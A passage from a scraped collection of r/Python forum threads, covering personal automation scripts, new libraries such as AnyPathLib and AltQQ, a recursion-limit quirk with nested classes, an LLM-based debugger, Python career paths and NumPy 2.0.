            "content": "https://github.com/cmang/durdraw is an ascii art editor I made that started out in 2009 as a 193-line Python 2 script. It could do some very primitive editing and saving, nothing else. Not even load. I was very much a \"play with curses, learning python\" project. I soon added animation, because the other editors I was using did not have that feature, and color. Eventually ported it to Python 3, added more features, more colors, got other people using and contributing to it. 15 years and many incremental changes later, it's doing pretty good now, for its niche (ANSI art editors). I still use it daily."
        },
        {
            "author": "Wallstreetbettss",
            "score": "259",
            "content": "I have one that it took me 5-10 mins to build and I have it running 24/7 on task scheduler since early 2022. It’s a laptop mouse shaker, it slightly moves every 10 mins.I work for a finance company that’s is a big brother. Our internal system flags gets flagged every 15 mins that there’s no interaction with the pc while you are logged in. And when that happens, managers get an automated email to check in with that person since we’re wfh.",
            "replies": [
                {
                    "author": "Shark8MyToeOff",
                    "score": "200",
                    "content": "You wrote this mouse shaker in python? I used to take naps with the mouse on my stomach so it would move the mouse whenever I breathed lol.🤣"
                }
            ]
        },
        {
            "author": "shakeweight4000",
            "score": "82",
            "content": "I have one that uses electric utility GIS data to create PDF maps of each circuit to use when the field crews need a paper map at job sites."
        },
        {
            "author": "TobofCob",
            "score": "54",
            "content": "Web scraping for me too. I fly a lot. Checking southwest on the app for price changes used to be easy, but when you have 8 flights booked at once it becomes cumbersome. So I built a script to check flight prices for my currently booked flights and notify me if the price has decreased more than X amount. It’s been really handy for my use case, and thankfully hasn’t broken yet despite relying on the southwest UI to stay the same."
        },
        {
            "author": "i1728",
            "score": "47",
            "content": "A tinnitus masker. The goal is to stream an audio loop to a particular audio output at a (configurable) fixed volume even as device output levels change. So, I've written a python program that does that through pulseaudio. I'd like to port it to rust, add support for streaming different files to different devices at different volumes, and turn it into a proper service, but we'll see."
        },
        {
            "author": "AlpacaDC",
            "score": "35",
            "content": "A color picker using Tkinter. At my job there are a few colors that I use frequently, so I can also pin the ones I want to use later. I know tools exactly like this already exist, but it was a great learning experience and I got to add a few very specific features tailored to my use."
        },
        {
            "author": "azshall",
            "score": "33",
            "content": "To help with taxes this year, I wrote a small library to batch extract all the transactions from my pdf bank statements into an indexable database. Made it super easy to search for specific expenses across all my accounts/credit cards so that I could dump it all into spread sheets to itemize for taxes. Something I’ve been wanting to do for years. Saved me hours if not days from having to go through them all by hand manually. Probably will expand upon it for next year."
        }
    ]
},
{
    "post_author": "baluyotraf",
    "post_id": "1bmxcwo",
    "post_score": "4",
    "post_time": "Monday, March 25, 2024 at 1:23:58 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Alternative Queries: Typed and Reusable Handcrafted SQL",
    "media": [
        "https://python-sql-parameters.readthedocs.io/en/latest/sqlparams.html",
        "https://github.com/baluyotraf/altqq"
    ],
    "post_content": "Hello!\nIt's still early in development, but I just want to know if people are interested.\nWhat My Project Does\nI created a library to integrate Pydantic type checking for handwritten SQL queries. It also allows you to test the types, and create nested queries easily.\nAlternative Queries\nTarget Audience\nWe had a project recently were we had to use handwritten SQL and managing the parameters and reusing queries was quite a hassle. So I'm planning to use this on my production projects moving forward.\nComparison\nI would say in terms of usage, it's like Pydantic + SqlParams, but only with the python default formatting.\nSqlParams",
    "comments": []
},
{
    "post_author": "koldakov",
    "post_id": "1bua0bg",
    "post_score": "0",
    "post_time": "Wednesday, April 3, 2024 at 12:09:01 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Python Inner class feature",
    "media": [
        "http://test.py/"
    ],
    "post_content": "test.py\nimport sys\nsys.setrecursionlimit(4)\nclass Foo:\n    class Foo:\n        foo = 1\npython test.py\nPlease be honest, write your guess in comments about the output of this code before opening the spoiler =)\nThe answer:\nDid you know?)",
    "comments": [
        {
            "author": "ToddBradley",
            "score": "5",
            "content": "Something like No symbol found: python",
            "replies": [
                {
                    "author": "koldakov",
                    "score": "-2",
                    "content": "Fixed)"
                },
                {
                    "author": "koldakov",
                    "score": "-3",
                    "content": "Please skip the last line with \"python test.py\". I really didn't know reddit's markdown is so unusable. I tried to make it pretty, but didn't manage. Now I'm scared to touch anything to make it even worse ...",
                    "replies": [
                        {
                            "author": "ToddBradley",
                            "score": "3",
                            "content": "Did I win - before you changed the contest, I mean?",
                            "replies": [
                                {
                                    "author": "koldakov",
                                    "score": "0",
                                    "content": "I think it would be a syntax error )"
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": "I would imagine it follows the markdown spec, i.e. ignoring double newlines.",
                            "replies": [
                                {
                                    "author": "koldakov",
                                    "score": "2",
                                    "content": "Yeah, looks like Also for some reason I can edit the post only with mobile app, anyway I’ve got how it works now"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "hhda",
            "score": "4",
            "content": "I didn't know. That's surprising and interesting. It also doesn't matter how you name the classes. Looks like it's a implementation detail of the parser that's leaking out in CPython.",
            "replies": [
                {
                    "author": "koldakov",
                    "score": "3",
                    "content": "I didn’t dig deeply into this, but I think it’s related to the fact, that class is a code sugar for type. And if you add inner properties they are being generated recursively, so yeah it’s definitely implementations details Haven’t seen anyone raised this before"
                },
                {
                    "author": "__Deric__",
                    "score": "2",
                    "content": "Not of the parser itself, but how classes are implemented. Using the dis module it seems that defining a class involves a function call: >>> import dis >>> dis.dis(\"class Foo:\\n\\tclass Foo:\\n\\t\\tfoo = 1\") 0           0 RESUME                   0 1           2 PUSH_NULL 4 LOAD_BUILD_CLASS 6 LOAD_CONST               0 (<code object Foo at 0x7f2f600bb590, file \"<dis>\", line 1>) 8 MAKE_FUNCTION            0 10 LOAD_CONST               1 ('Foo') 12 CALL                     2 20 STORE_NAME               0 (Foo) 22 RETURN_CONST             2 (None) Disassembly of <code object Foo at 0x7f2f600bb590, file \"<dis>\", line 1>: 1           0 RESUME                   0 2 LOAD_NAME                0 (__name__) 4 STORE_NAME               1 (__module__) 6 LOAD_CONST               0 ('Foo') 8 STORE_NAME               2 (__qualname__) 2          10 PUSH_NULL 12 LOAD_BUILD_CLASS 14 LOAD_CONST               1 (<code object Foo at 0x7f2f649f0510, file \"<dis>\", line 2>) 16 MAKE_FUNCTION            0 18 LOAD_CONST               0 ('Foo') 20 CALL                     2 28 STORE_NAME               3 (Foo) 30 RETURN_CONST             2 (None) Disassembly of <code object Foo at 0x7f2f649f0510, file \"<dis>\", line 2>: 2           0 RESUME                   0 2 LOAD_NAME                0 (__name__) 4 STORE_NAME               1 (__module__) 6 LOAD_CONST               0 ('Foo.Foo') 8 STORE_NAME               2 (__qualname__) 3          10 LOAD_CONST               1 (1) 12 STORE_NAME               3 (foo) 14 RETURN_CONST             2 (None) Notice how for every class definition a function is created (MAKE_FUNCTION) and called (CALL), leading to two nested function calls."
                }
            ]
        },
        {
            "author": "anentropic",
            "score": "1",
            "content": "I thought this was going to be lame but it's actually surprising... 👍",
            "replies": [
                {
                    "author": "koldakov",
                    "score": "1",
                    "content": "Thanks =)"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1btk4m5",
    "post_score": "6",
    "post_time": "Tuesday, April 2, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "kfirgold99",
    "post_id": "1bsx1t5",
    "post_score": "47",
    "post_time": "Monday, April 1, 2024 at 10:03:53 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "AnyPathLib - A unified PathLib-like API for cloud storages",
    "media": [
        "https://github.com/kfirgoldberg/AnyPathLib",
        "https://x.com/kfir99/status/1773619987095097767?s=20"
    ],
    "post_content": "Hi everybody,\nI'm happy to share AnyPathLib 🛣️, a pip package I created to simplify access to different storage resources - S3, Azure, and local storage.\nWhat My Project Does:\nBasically, instead of writing custom code to handle the different storage resources using the SDK (boto3, azure-sdk), you can now just use AnyPathLib:\nfrom anypathlib import AnyPath\n  \n\n  \n# Create an AnyPath instance for a local file\n  \n\n  \nlocal_file = AnyPath(\"/path/to/local/file.txt\")\n  \n\n  \n# Create an AnyPath instance for an S3 object\n  \n\n  \ns3_file = AnyPath(\"s3://bucket/path/to/object.txt\")\n  \n\n  \n# Copy a file from local to S3\n  \n\n  \nlocal_file.copy(s3_file)\n  \n\n  \n# Copy a directory from S3 to Azure\n  \n\n  \ns3_dir = AnyPath(\"s3://bucket/path/to/dir\") \n  \nazure_dir = AnyPath(\"https://account_name.blob.core.windows.net/container_name/path\") \n\ns3_dir.copy(azure_dir)\nThere are other cool features to save you some time, so check out this X thread for some more details or visit the Github project page.\nTarget Audience:\nAnybody which works with both a local environment and Azure or AWS, and could use a simplified API to access their storage\nComparison:\nI didn't find any similar library (that's why I wrote this one) - there are dedicated packages for S3 (boto3) and the Azure SDK, but they come with different, and somewhat unintuitive APIs.\nI'd love to hear your feedback, issues, and of course - PRs :)",
    "comments": [
        {
            "author": "Berecursive",
            "score": "30",
            "content": "fsspec is a pretty popular implementation of this paradigm",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "2",
                    "content": "also object-store, which is pretty popular on the rust side for the arrow universe and now has a python package"
                },
                {
                    "author": "qckpckt",
                    "score": "1",
                    "content": "My first thought too. To be honest, I’m not surprised that OP didn’t find it. There’s something fundamentally broken about search engines and finding things like this. I’ve found that ChatGPT is surprisingly good at this kind of query though. EG - any time I’m faced with a problem where I’m like “there must be a solution already for this” I ask ChatGPT “what libraries are there in {language} to solve {problem}”, and then Google to research the libs it throws out.",
                    "replies": [
                        {
                            "author": "fatbob42",
                            "score": "1",
                            "content": "Doesn’t fsspec use internal threads? I don’t use it because that implementation gives me the willies :) Edit: I just took another look at it and none of the bad stuff I remember is there. It’s a bit over-engineered for what I need but it looks ok. It also looks actively developed."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Thatgreenvw",
            "score": "14",
            "content": "What about cloudpathlib? It’s top hit if you search “pathlib cloud”."
        },
        {
            "author": "LesserNice",
            "score": "13",
            "content": "looks cool, thanks for sharing There are a bunch of similar libraries, the most popular of them being fsspec"
        },
        {
            "author": "ArgetDota",
            "score": "8",
            "content": "I would just like to point out that fsspec’s universal-pathlib already exists and is very well tested and stable"
        },
        {
            "author": "lebrumar",
            "score": "7",
            "content": "Neat Idea. Fsspec comes to mind as a library to study to compare it with your work."
        },
        {
            "author": "ThatSituation9908",
            "score": "4",
            "content": "Interestingly, your package doesn't depend in fsspec and its extension package (e.g., s3fs) Adding that would alleviate the need for you to maintain all the implementations of multiple sources."
        },
        {
            "author": "fatbob42",
            "score": "3",
            "content": "Since pyfilesystem seems to be dying, it’s a good time for these kinds of alternatives."
        },
        {
            "author": "Rize92",
            "score": "2",
            "content": "It would be worth adding here what your library offers compared to the alternatives (e.g. fsspec). I fear you’re not going to get good feedback because everyone here is stuck on the fact that this looks like a copy of what already exists."
        },
        {
            "author": "radarsat1",
            "score": "2",
            "content": "what packages like this support asyncio?"
        },
        {
            "author": "NFicano",
            "score": "1",
            "content": "This is great, nice work!"
        },
        {
            "author": "toxic_acro",
            "score": "1",
            "content": "Barney Gale has been working for a while on making the Path objects from the stdlib Path lib extensible and recently made available a backport of the features that will be included in future Python versions https://discuss.python.org/t/make-pathlib-extensible/3428 https://github.com/barneygale/pathlib-abc Concrete implementations of the new abstract base classes could work better as a way to literally use the pathlib interface",
            "replies": [
                {
                    "author": "fatbob42",
                    "score": "1",
                    "content": "Thanks - this is fantastic and is the right way to go. I didn’t think this problem was mainstream enough for them to implement it in the std lib."
                }
            ]
        },
        {
            "author": "Gering1993",
            "score": "0",
            "content": "fsspec already does this. Apache Libcloud too. „Don’t reinvent the wheel”"
        }
    ]
},
{
    "post_author": "baluyotraf",
    "post_id": "1bmxcwo",
    "post_score": "4",
    "post_time": "Monday, March 25, 2024 at 1:23:58 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Alternative Queries: Typed and Reusable Handcrafted SQL",
    "media": [
        "https://python-sql-parameters.readthedocs.io/en/latest/sqlparams.html",
        "https://github.com/baluyotraf/altqq"
    ],
    "post_content": "Hello!\nIt's still early in development, but I just want to know if people are interested.\nWhat My Project Does\nI created a library to integrate Pydantic type checking for handwritten SQL queries. It also allows you to test the types, and create nested queries easily.\nAlternative Queries\nTarget Audience\nWe had a project recently were we had to use handwritten SQL and managing the parameters and reusing queries was quite a hassle. So I'm planning to use this on my production projects moving forward.\nComparison\nI would say in terms of usage, it's like Pydantic + SqlParams, but only with the python default formatting.\nSqlParams",
    "comments": []
},
{
    "post_author": "kpetkar",
    "post_id": "1bkftjd",
    "post_score": "28",
    "post_time": "Thursday, March 21, 2024 at 10:58:51 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Leaping: Fix tests instantly with an omniscient debugger",
    "media": [
        "https://github.com/gleb-sevruk/pycrunch-trace",
        "https://github.com/leapingio/leaping",
        "https://www.loom.com/share/94ebe34097a343c39876d7109f2a1428"
    ],
    "post_content": "Link to Repo: https://github.com/leapingio/leaping\nWhat My Project Does\nWe’ve all been in hell when you have no idea why a test might be failing. You set a breakpoint, add print statements, and re-run the code, all to realize that you added them in the wrong spot or need to step backward.\nLeaping is a simple, fast and lightweight omniscient debugger for Python tests. Leaping traces the execution of your code and allows you to retroactively inspect the state of your program at any time, using an LLM-based debugger with natural language.\nUsing Leaping, you can quickly get the answer to questions like:\nWhat was the value of variable x at this point?\nWhat was variable y set to this value?\nWhy am I not hitting function x?\nWhat changes can I make to this test/code to make it pass?\nHere’s a brief demo of it in action: https://www.loom.com/share/94ebe34097a343c39876d7109f2a1428\nTarget Audience\nThis is useful for any Python developer who is struggling with a test or even just an issue from production\nComparison\nThere’s just one alternative https://github.com/gleb-sevruk/pycrunch-trace. It’s different because it requires you to meticulously instrument your code, is quite difficult to set up (we built this because it took us almost a day to do so!) and requires uploading your trace data to a somewhat janky web portal.\nHere’s a link to the repo and we’d love it if you played around with it. We’re committed to being open-source and welcome all issues, feature requests or even contributions!",
    "comments": [
        {
            "author": "tomster10010",
            "score": "68",
            "content": "I don't see myself ever using a debugger that: I need to pay for Sends my codebase to a third party can lie to me Also you have your posthog api key in your repository. Also why the fuck are you recording my email, what the fuck? this is practically spyware. The tracing stuff looks cool, but even if it were free and guaranteed to work, I wouldn't want to interact with a debugger in natural language.",
            "replies": [
                {
                    "author": "thisismyfavoritename",
                    "score": "15",
                    "content": "\"please debugger, put a breakpoint at L12. No i said L12, this is not L12. Step one instruction. No not over the function, can you restart execution?\""
                },
                {
                    "author": "kpetkar",
                    "score": "-20",
                    "content": ""
                }
            ]
        },
        {
            "author": "teerre",
            "score": "24",
            "content": "How irresponsible you have to be to not understand an error in a test, ask some 3rd party service to fix it and just copy paste the result. How can people write code they don't understand? Hopefully it's nothing important",
            "replies": [
                {
                    "author": "Kiuhnm",
                    "score": "1",
                    "content": "How irresponsible you have to be to not understand an error in a test The problem is not that error but its cause, which might not be obvious at all. ask some 3rd party service to fix it and just copy paste the result. Who says you \"just copy paste the result\"? That said, I don't use any AI-based product and I have no agenda whatsoever. I just like to be as intellectually honest as possible."
                }
            ]
        },
        {
            "author": "jabbalaci",
            "score": "1",
            "content": "Why is it on Loom? Why is the quality just 720p?"
        },
        {
            "author": "mrtransisteur",
            "score": "-7",
            "content": ""
        }
    ]
},
{
    "post_author": "br2krl",
    "post_id": "1bo796n",
    "post_score": "11",
    "post_time": "Tuesday, March 26, 2024 at 3:57:30 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "\"Mark as read\" plugin for mkdocs-material",
    "media": [
        "https://berk-karaal.github.io/mkdocs-material-mark-as-read/",
        "https://github.com/berk-karaal/mkdocs-material-mark-as-read"
    ],
    "post_content": "Hi everyone, I developed a simple plugin for mkdocs-material.\nWhat My Project Does:\nIn simple terms, this plugin allows users to mark pages as read and it shows a checkmark icon in navigation bar for the pages that was marked as read.\nThe plugin adds a button under the page content and when users clicks, it stores read date in localStorage. It shows a checkmark icon in the navigation panels for the pages that marked as read. It also shows a \"document updated\" icon if the pages that marked as read got an update.\nTarget Audience:\nAnyone who has a website built with Material for MkDocs (a.k.a. mkdocs-material).\nThis plugin could be useful for the pages that user read by an order and wants to continue from where it left. I guess the Learn page of FastAPI documentation could be a great example to that.\nComparison: No alternative plugin exist for Material for MkDocs afaik\nProject repo: github.com/berk-karaal/mkdocs-material-mark-as-read\nYou can try this plugin on the documentation website. Let me know what you think about this plugin. Also please share if you have a feature request or an idea to improve this plugin.",
    "comments": [
        {
            "author": "crawl_dht",
            "score": "1",
            "content": "This is a useful feature. Can you also add if the user reaches at the bottom of the page, it is automatically marked as read?",
            "replies": [
                {
                    "author": "br2krl",
                    "score": "1",
                    "content": "Great idea, I will see if I can add this feature"
                }
            ]
        }
    ]
},
{
    "post_author": "Grandtosh",
    "post_id": "1bfn966",
    "post_score": "97",
    "post_time": "Friday, March 15, 2024 at 11:11:27 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Is backend development the most common career path",
    "media": [],
    "post_content": "Maybe i worded my title wrong. Taking a look at job listings involving python, backend development seems to be the only listing I come across. Why is that the case ? Are they no other career paths outside backend dev for python developers ?",
    "comments": [
        {
            "author": "Every_Ad_598",
            "score": "188",
            "content": "The frontend world is utterly and entirely dominated by javascript. That leaves backend, but with Python you also have the whole data science / ML universe."
        },
        {
            "author": "Shuduh",
            "score": "48",
            "content": "I think you are asking the wrong question. What kind of work do you want to do? Frontend? AI/ML? Data Science? App development? Then pick the language/framworks that will suit you the best.",
            "replies": [
                {
                    "author": "jelle284",
                    "score": "9",
                    "content": "Exactly. Picking a language and then going for the topic which best fits is completely backwards. Learn a subject you like and then find out afterwards what a python (or other well suited language) implementation looks like. Knowing python doesn't mean you know machine learning and vice versa. But learning the required python if you already know machine learning is a better approach than learning the required ML stuff after you already know python."
                }
            ]
        },
        {
            "author": "broxamson",
            "score": "119",
            "content": "Well you're definitely not going to be doing python on the front end that's for sure lol",
            "replies": [
                {
                    "author": "yvrelna",
                    "score": "28",
                    "content": "Technically, you can use Python on the front-end, with WASM and all that, it's possible to compile Python code to run on the front-end. PyScript for example. That said, you're going to be trodding through a rarely walked path, and you're not likely going to find jobs where you use it."
                }
            ]
        },
        {
            "author": "yvrelna",
            "score": "46",
            "content": "Python is used in a wide variety of applications. Data science/ML/AI: Python is by far the most popular language in this, far exceeding even specialised ML/data science languages like R and Julia. Backend development: Python has a very strong presence in web development. Lots of enterprise apps and products are written in Python. Scientific programming: if you do this kind of programming, you're more likely to be a scientist who just happens to do so some programming, rather than being a professional software developer. But it's not uncommon for bigger projects of this kind to hire software engineers to help the team improve their software engineering. CI/DevOps: the most common language used here is bash/shell script, but you'll often find that when people need to build something more complicated, the language they turn to build then is most likely Python. Ansible/Salt/Puppet are all written in Python. Linux systems programming: most traditional systems programs are written in C, but for tasks where you don't need the speed of light and it's complex enough that shell scripts don't cut it, you'll likely see them written in Python. Big example of programs of this kind is portage, yum, and some parts of apt like aptdaemon, also system tools like ufw (firewall). Desktop apps: Python isn't the most popular choice here, but there are a good many GUI applications written in Python Industrial automations: historically, these automations are generally written in some legacy DSL, but there's been some shift towards using general purpose programming language to do these because these automatons increasingly need to be integrated with other systems at the highest level. Python is one the top language used for this type of programming. QA automation: Python is used extensively in physical product test automations, the test scripts are often written in Python. Even for software, it's not even uncommon to see software that aren't written in Python but their tests written in Python. Generally speaking, anytime you see any fields where people who wouldn't really consider themselves programmers need to do some programming to automate repetitive tasks, Python is likely the top choice, especially if there isn't some already established domain specific language to do that, or for tasks where you need to glue those automations with bigger enterprise systems."
        },
        {
            "author": "Full-Cow-7851",
            "score": "19",
            "content": "DevOps / Platform. Anything Data related (Data Engineering, ML Engineering, Data Science/analytics). Backend development. Or just that \"I glue systems together and do a bit of everything\" guy often called like automation engineer or something."
        },
        {
            "author": "Distinct-Analysis740",
            "score": "13",
            "content": "You could be a streamlit dev"
        },
        {
            "author": "LinearArray",
            "score": "15",
            "content": "No it isn't. If you check developer trends and stats you'll see there are a lot of frontend developers compared to backend engineers. Are they no other career paths outside backend dev for python developers ? No. Data science, ML/AI, Analytics etc. exist."
        },
        {
            "author": "riklaunim",
            "score": "10",
            "content": "Mobile is non-existent, game dev as well even when Python is used as a helper the main software stacks are not Python. Desktop apps are rare, somethime PyQt / Qt shows up but realistically you would have to be a Qt developer as well. Web development (backend only or full stack) is the most common followed by some sort of data management/automation/processing with growing AI/ML separate branch."
        }
    ]
},
{
    "post_author": "rubiesordiamonds",
    "post_id": "1bff8nc",
    "post_score": "103",
    "post_time": "Friday, March 15, 2024 at 5:28:44 PM GMT+3",
    "flair_text": "News",
    "post_title": "Ralf Gommers, leading maintainer of NumPy, on the release of NumPy 2.0",
    "media": [
        "https://open.substack.com/pub/onceamaintainer/p/once-a-maintainer-ralf-gommers?r=2773u5&utm_campaign=post&utm_medium=web&showWelcomeOnShare=true"
    ],
    "post_content": "We spoke with Ralf about the upcoming 2.0 release, the first major release in 16 years. Ralf has a great story as to how he got into the open source community in general, and NumPy and SciPy in particular.\nYou can check it out here: https://open.substack.com/pub/onceamaintainer/p/once-a-maintainer-ralf-gommers?r=2773u5&utm_campaign=post&utm_medium=web&showWelcomeOnShare=true",
    "comments": [
        {
            "author": "15287331",
            "score": "41",
            "content": "Wow said he spent 10-15 hours a week working on it for 10+ years? Crazy",
            "replies": [
                {
                    "author": "Probono_Bonobo",
                    "score": "21",
                    "content": "Equivalent to 2.5 years of full time work, I'd say that sounds about right. Pretty impressive actually without a paid team."
                }
            ]
        }
    ]
}
]